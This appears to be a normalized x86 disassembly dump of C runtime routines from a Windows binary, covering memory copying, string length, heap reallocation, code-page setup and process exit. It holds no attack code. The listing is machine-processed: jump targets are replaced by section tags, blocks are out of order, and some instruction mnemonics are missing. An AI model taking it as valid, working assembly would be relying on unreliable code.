cmp [ ebp + 0xc ] ecx
je r-xdata
movzx bx [ esi ]
test bx bx
je r-xdata
push 0x19
call sub_41373b
pop ecx
lea eax [ esi - 0x1 ]
jmp r-xdata
jmp r-xdata
sub_4113d9
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
xor eax eax
pop esi
retn
push esi
call sub_411a10
inc eax
push eax
call sub_410b8c
pop ecx
test eax eax
pop ecx
je r-xdata
push esi
push eax
call sub_415bf0
pop ecx
pop ecx
pop esi
retn
sub_411453
push edi
call sub_4114f8
push 0x1
pop edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] bl
jne r-xdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rw-data
push rw-data
call sub_41150a
pop ecx
pop ecx
test ebx ebx
pop ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov [ rw-data ] edi
call [ ExitProcess@IAT ]
call sub_411501
pop edi
retn
push rw-data
push rw-data
call sub_41150a
pop ecx
pop ecx
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb r-xdata
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
sub esi 0x4
cmp esi [ rw-data ]
jae r-xdata
call eax
sub_411530
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_411580
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
test edi 0x3
jne r-xdata
cmp edi eax
jb r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_4115e0 ]
jmp [ ecx * 4 + jump_table_41165c ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4116c8 ]
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
inc esi
shr ecx 0x2
inc edi
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_4116c8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
jmp [ ecx * 4 + jump_table_411860 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_411768 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_411860 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4116c8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4116c8 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_4116c8 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_411860 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_411860 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_411860 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_411860 ]
sub_4118b5
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ rw-data ] ebx
push esi
push edi
jne r-xdata
push [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
call sub_411a10
mov edi esi
push esi
sub edi eax
call sub_411a10
pop ecx
add edi eax
pop ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_415e20
pop ecx
pop ecx
jmp r-xdata
xor eax eax
cmp esi edi
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ esi ] bl
mov eax [ ebp + 0xc ]
je r-xdata
cmp [ eax ] bl
je r-xdata
mov edx esi
sub edx eax
mov eax esi
jmp r-xdata
push esi
call sub_41155f
pop ecx
mov esi eax
jmp r-xdata
cmp [ edx + eax ] cl
jne r-xdata
cmp [ esi ] bl
je r-xdata
inc eax
cmp [ edx + eax ] bl
jne r-xdata
mov cl [ eax ]
cmp cl bl
je r-xdata
sub_41192b
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push edi
push 0x19
call sub_4136da
pop ecx
mov ecx [ ebp + 0x8 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_415f20
pop ecx
pop ecx
jmp r-xdata
cmp [ ebp + 0xc ] eax
mov dl [ ecx + 0x1 ]
inc ecx
test dl dl
je r-xdata
pop esi
pop ebp
retn
inc ecx
test dl dl
jne r-xdata
mov esi ecx
test esi esi
jmp r-xdata
movzx edi dl
shl eax 0x8
or eax edi
cmp [ ebp + 0xc ] eax
jne r-xdata
mov dl [ ecx ]
movzx eax dl
movzx edi al
test [ edi + rw-data ] 0x4
je r-xdata
push 0x19
call sub_41373b
pop ecx
mov eax esi
pop edi
jne r-xdata
lea esi [ ecx - 0x1 ]
jmp r-xdata
sub_41199d
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_41605f
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_415f47
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_411a10
mov ecx [ esp + 0x4 ]
test ecx 0x3
je r-xdata
mov eax [ ecx ]
mov edx 0x7efefeff
add edx eax
xor eax 0xffffffff
xor eax edx
add ecx 0x4
test eax 0x81010100
je r-xdata
mov al [ ecx ]
inc ecx
test al al
je r-xdata
mov eax [ ecx - 0x4 ]
test al al
je r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ecx 0x3
jne r-xdata
lea eax [ ecx - 0x4 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test ah ah
je r-xdata
add eax 0x0
lea eax [ ecx - 0x3 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff0000
je r-xdata
lea eax [ ecx - 0x2 ]
mov ecx [ esp + 0x4 ]
sub eax ecx
retn
test eax 0xff000000
je r-xdata
jmp r-xdata
sub_411a8b
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_41605f
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_415f47
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_411add
push ebp
mov ebp esp
push ebx
xor ebx ebx
cmp [ ebp + 0x10 ] ebx
push esi
push edi
je r-xdata
xor eax eax
cmp [ rw-data ] ebx
jne r-xdata
push 0x19
call sub_4136da
dec [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
pop ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_416870
add esp 0xc
jmp r-xdata
movzx bx [ esi ]
movzx eax bl
inc esi
test [ eax + rw-data ] 0x4
je r-xdata
cmp [ ebp + 0x10 ] ebx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0xc ] bx
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov al [ edi ]
test al al
jne r-xdata
movzx eax [ esi ]
mov [ ebp + 0xc ] ebx
test [ eax + rw-data ] 0x4
jne r-xdata
push 0x19
call sub_41373b
cmp bx [ ebp + 0xc ]
pop ecx
sbb eax eax
and eax 0x2
dec eax
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov al [ esi ]
dec [ ebp + 0x10 ]
test al al
jne r-xdata
xor edx edx
inc edi
mov dh cl
mov dl al
mov [ ebp + 0xc ] edx
mov [ ebp + 0xc ] ebx
jmp r-xdata
push 0x19
call sub_41373b
pop ecx
mov ebx eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
dec [ ebp + 0x10 ]
test eax eax
je r-xdata
xor ecx ecx
inc esi
mov ch bl
mov cl al
mov ebx ecx
xor ebx ebx
jmp r-xdata
movzx cx [ edi ]
movzx eax cl
inc edi
mov [ ebp + 0xc ] ecx
test [ eax + rw-data ] 0x4
je r-xdata
sub_411bcc
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0xff
jbe r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
and [ ebp - 0x4 ] 0x0
push edi
xor eax eax
lea edi [ ebp - 0x2 ]
stosw [ edi ]
mov eax ecx
mov [ ebp + 0xb ] cl
shr eax 0x8
cmp [ rw-data ] 0x0
mov [ ebp + 0xa ] al
pop edi
jne r-xdata
mov eax [ rw-data ]
mov al [ eax + ecx * 2 ]
and eax 0x4
leave
retn
push 0x4
push ecx
call sub_4138b4
pop ecx
pop ecx
leave
retn
push 0x1
lea eax [ ebp - 0x4 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp + 0xa ]
push 0x2
push eax
push 0x1
call sub_4168a8
add esp 0x1c
test eax eax
je r-xdata
xor eax eax
leave
retn
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
test [ ebp - 0x4 ] 0x4
je r-xdata
push 0x1
pop eax
leave
retn
sub_411cab
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
cmp ecx 0xff
jbe r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
and [ ebp - 0x4 ] 0x0
push edi
xor eax eax
lea edi [ ebp - 0x2 ]
stosw [ edi ]
mov eax ecx
mov [ ebp + 0xb ] cl
shr eax 0x8
cmp [ rw-data ] 0x0
mov [ ebp + 0xa ] al
pop edi
jne r-xdata
mov eax [ rw-data ]
mov al [ eax + ecx * 2 ]
and eax 0x8
leave
retn
push 0x8
push ecx
call sub_4138b4
pop ecx
pop ecx
leave
retn
push 0x1
lea eax [ ebp - 0x4 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp + 0xa ]
push 0x2
push eax
push 0x1
call sub_4168a8
add esp 0x1c
test eax eax
je r-xdata
xor eax eax
leave
retn
cmp [ ebp - 0x2 ] 0x0
jne r-xdata
test [ ebp - 0x4 ] 0x8
je r-xdata
push 0x1
pop eax
leave
retn
sub_411d3a
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
cmp esi 0xffffffe0
jbe r-xdata
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x2
jne r-xdata
push 0x9
call sub_4136da
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
push edi
call sub_41454d
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
test esi esi
jne r-xdata
test esi esi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_411dcc
cmp [ ebp - 0x20 ] 0x0
jne r-xdata
and [ ebp - 0x1c ] 0x0
cmp esi [ rw-data ]
ja r-xdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
add esi 0xf
and esi 0xfffffff0
mov [ ebp + 0xc ] esi
push 0x9
call sub_4136da
pop ecx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov edi [ ebp + 0x8 ]
push edi
call sub_4152a8
add esp 0xc
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
push 0x1
pop esi
mov eax [ ebp - 0x1c ]
jmp r-xdata
push esi
push edi
push eax
call sub_414d56
add esp 0xc
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_411e61
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
and [ ebp - 0x1c ] 0x0
cmp esi [ rw-data ]
ja r-xdata
mov [ ebp - 0x1c ] edi
jmp r-xdata
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
call sub_410472
pop ecx
pop ecx
jmp r-xdata
shr esi 0x4
push esi
push eax
push [ ebp - 0x24 ]
push [ ebp - 0x2c ]
call sub_415670
add esp 0x10
test eax eax
je r-xdata
push esi
push [ ebp + 0x8 ]
push 0x10
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] edi
sub_411e9e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
cmp eax 0x2
jne r-xdata
push 0x9
call sub_4136da
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
push esi
call sub_41454d
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
mov esi eax
push 0x9
call sub_4136da
pop ecx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x8 ]
call sub_4152a8
add esp 0xc
mov [ ebp - 0x28 ] eax
test eax eax
je r-xdata
mov esi [ ebp - 0x20 ]
mov esi [ esi - 0x4 ]
sub esi 0x9
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi [ ebp - 0x20 ]
movzx esi [ eax ]
shl esi 0x4
mov [ ebp - 0x20 ] esi
jmp r-xdata
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_411f08
cmp [ ebp - 0x1c ] 0x0
jmp r-xdata
mov eax esi
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
or [ ebp - 0x4 ] 0xffffffff
call sub_411f83
cmp [ ebp - 0x28 ] 0x0
sub_411f8c
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push 0x19
call sub_4136da
push [ ebp + 0x8 ]
call sub_412139
mov ebx eax
pop ecx
cmp ebx [ rw-data ]
pop ecx
mov [ ebp + 0x8 ] ebx
jne r-xdata
test ebx ebx
je r-xdata
xor esi esi
jmp r-xdata
call sub_4121b6
xor edx edx
mov eax rw-data
push 0x19
call sub_41373b
pop ecx
mov eax esi
pop edi
pop esi
pop ebx
leave
retn
and [ ebp - 0x4 ] 0x0
push 0x40
pop ecx
xor eax eax
mov edi rw-data
lea esi [ edx + edx * 2 ]
[ edi ]
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rw-data ]
add eax 0x30
inc edx
cmp eax rw-data
jl r-xdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
cmp [ eax ] ebx
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call [ GetCPInfo@IAT ]
push 0x1
pop esi
cmp eax esi
jne r-xdata
cmp [ ebx ] 0x0
mov ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] eax
call sub_412183
lea esi [ esi + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x40
and [ rw-data ] 0x0
pop ecx
xor eax eax
mov edi rw-data
cmp [ ebp - 0x18 ] esi
[ edi ]
stosb [ edi ]
mov [ rw-data ] ebx
jbe r-xdata
call sub_4121df
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rw-data ]
or esi 0xffffffff
and [ rw-data ] 0x0
cmp [ ebp - 0x12 ] 0x0
je r-xdata
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
mov eax esi
lea ecx [ ebp - 0x11 ]
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
push ebx
call sub_412183
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] esi
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
or [ eax + rw-data ] 0x4
inc eax
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
cmp eax edx
ja r-xdata
sub_412139
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetOEMCP@IAT ]
cmp eax 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
jmp [ GetACP@IAT ]
retn
mov eax [ rw-data ]
mov [ rw-data ] 0x1
sub_412183
mov eax [ esp + 0x4 ]
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_4121b6
push edi
push 0x40
pop ecx
xor eax eax
mov edi rw-data
[ edi ]
stosb [ edi ]
xor eax eax
mov edi rw-data
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
pop edi
retn
sub_4121df
push ebp
mov ebp esp
sub esp 0x514
lea eax [ ebp - 0x14 ]
push esi
push eax
push [ rw-data ]
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
xor eax eax
mov esi 0x100
xor eax eax
mov esi 0x100
cmp eax 0x61
jb r-xdata
cmp eax 0x5a
ja r-xdata
mov [ ebp + eax - 0x114 ] al
inc eax
cmp eax esi
jb r-xdata
mov al [ ebp - 0xe ]
mov [ ebp - 0x114 ] 0x20
test al al
je r-xdata
and [ eax + rw-data ] 0x0
cmp eax 0x7a
ja r-xdata
or [ eax + rw-data ] 0x10
mov cl al
add cl 0x20
push 0x0
lea eax [ ebp - 0x514 ]
push [ rw-data ]
push [ rw-data ]
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x1
call sub_4168a8
push 0x0
lea eax [ ebp - 0x214 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push esi
push [ rw-data ]
call sub_41596a
push 0x0
lea eax [ ebp - 0x314 ]
push [ rw-data ]
push esi
push eax
lea eax [ ebp - 0x114 ]
push esi
push eax
push 0x200
push [ rw-data ]
call sub_41596a
add esp 0x5c
xor eax eax
lea ecx [ ebp - 0x514 ]
push ebx
push edi
lea edx [ ebp - 0xd ]
cmp eax 0x41
jb r-xdata
pop esi
leave
retn
or [ eax + rw-data ] 0x20
mov cl al
sub cl 0x20
jmp r-xdata
inc eax
cmp eax esi
jb r-xdata
test dl 0x2
je r-xdata
or [ eax + rw-data ] 0x10
mov dl [ ebp + eax - 0x214 ]
inc edx
inc edx
mov al [ edx - 0x1 ]
test al al
jne r-xdata
sub ecx eax
lea edi [ ebp + eax - 0x114 ]
inc ecx
mov eax 0x20202020
mov ebx ecx
shr ecx 0x2
[ edi ]
mov ecx ebx
and ecx 0x3
[ edi ]
mov [ eax + rw-data ] cl
jmp r-xdata
and [ eax + rw-data ] 0x0
or [ eax + rw-data ] 0x20
mov dl [ ebp + eax - 0x314 ]
jmp r-xdata
inc eax
inc ecx
inc ecx
cmp eax esi
jb r-xdata
movzx ecx [ edx ]
movzx eax al
cmp eax ecx
ja r-xdata
pop edi
pop ebx
mov dx [ ecx ]
test dl 0x1
je r-xdata
jmp r-xdata
mov [ eax + rw-data ] dl
jmp r-xdata
sub_412380
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0x0
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
je r-xdata
mov esi [ ebp + 0x8 ]
mov esi [ ebp + 0x8 ]
mov [ ecx ] 0x2d
inc ecx
neg esi
jmp r-xdata
add bl 0x30
add bl 0x57
jmp r-xdata
mov edi ecx
mov eax esi
xor edx edx
div [ ebp + 0x10 ]
mov eax esi
mov ebx edx
xor edx edx
div [ ebp + 0x10 ]
cmp ebx 0x9
mov esi eax
jbe r-xdata
and [ ecx ] 0x0
dec ecx
mov [ ecx ] bl
inc ecx
test esi esi
ja r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
mov [ edi ] al
dec ecx
inc edi
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4123dc
push ebp
mov ebp esp
xor eax eax
cmp [ ebp + 0x10 ] 0xa
jne r-xdata
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_412380
mov eax [ ebp + 0xc ]
add esp 0x10
pop ebp
retn
cmp [ ebp + 0x8 ] eax
jge r-xdata
push 0x1
pop eax
sub_412424
push ebp
mov ebp esp
add esp 0xfffffff4
fwait
fnstcw [ ebp - 0x2 ]
fwait
mov ax [ ebp - 0x2 ]
or ah 0xc
mov [ ebp - 0x4 ] ax
fldcw [ ebp - 0x4 ]
fistp [ ebp - 0xc ]
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
leave
retn
sub_41244b
mov ecx [ esp + 0x8 ]
mov eax [ esp + 0x4 ]
push esi
mov dx [ ecx ]
lea esi [ eax + 0x2 ]
mov [ eax ] dx
pop esi
retn
mov dx [ ecx ]
mov [ esi ] dx
inc esi
inc esi
jmp r-xdata
inc ecx
inc ecx
test dx dx
je r-xdata
sub_412470
mov ecx [ esp + 0xc ]
push esi
push edi
mov edi [ esp + 0xc ]
test ecx ecx
mov esi edi
je r-xdata
mov eax esi
pop edi
pop esi
retn
mov edx [ esp + 0x10 ]
test ecx ecx
je r-xdata
dec ecx
jne r-xdata
dec ecx
je r-xdata
mov ax [ edx ]
mov [ edi ] ax
inc edi
inc edi
inc edx
inc edx
test ax ax
je r-xdata
xor eax eax
shr ecx 0x1
[ edi ]
adc ecx ecx
[ edi ]
sub_4124ad
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x28
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp ebx edi
jne r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
push [ ebp + 0xc ]
call sub_410b8c
pop ecx
jmp r-xdata
mov eax [ rw-data ]
cmp eax 0x3
jne r-xdata
push ebx
call sub_410cc6
pop ecx
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
cmp eax 0x2
jne r-xdata
mov [ ebp - 0x24 ] edi
cmp esi 0xffffffe0
ja r-xdata
xor eax eax
xor eax eax
cmp esi 0xffffffe0
ja r-xdata
cmp esi 0xffffffe0
ja r-xdata
mov eax [ ebp - 0x24 ]
cmp eax edi
jne r-xdata
push 0x9
call sub_4136da
pop ecx
mov [ ebp - 0x4 ] edi
push ebx
call sub_41454d
pop ecx
mov [ ebp - 0x28 ] eax
cmp eax edi
je r-xdata
cmp eax edi
jne r-xdata
cmp esi edi
jne r-xdata
mov [ ebp - 0x24 ] edi
cmp esi 0xffffffe0
ja r-xdata
cmp esi edi
jbe r-xdata
cmp [ rw-data ] edi
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
call sub_412638
cmp [ ebp - 0x28 ] edi
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
cmp [ rw-data ] edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
push 0x1
pop esi
mov eax [ ebp - 0x24 ]
cmp eax edi
jne r-xdata
push 0x9
call sub_4136da
pop ecx
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x38 ]
push eax
push ebx
call sub_4152a8
add esp 0xc
mov edi eax
mov [ ebp - 0x30 ] edi
test edi edi
je r-xdata
push 0x10
pop esi
add esi 0xf
and esi 0xfffffff0
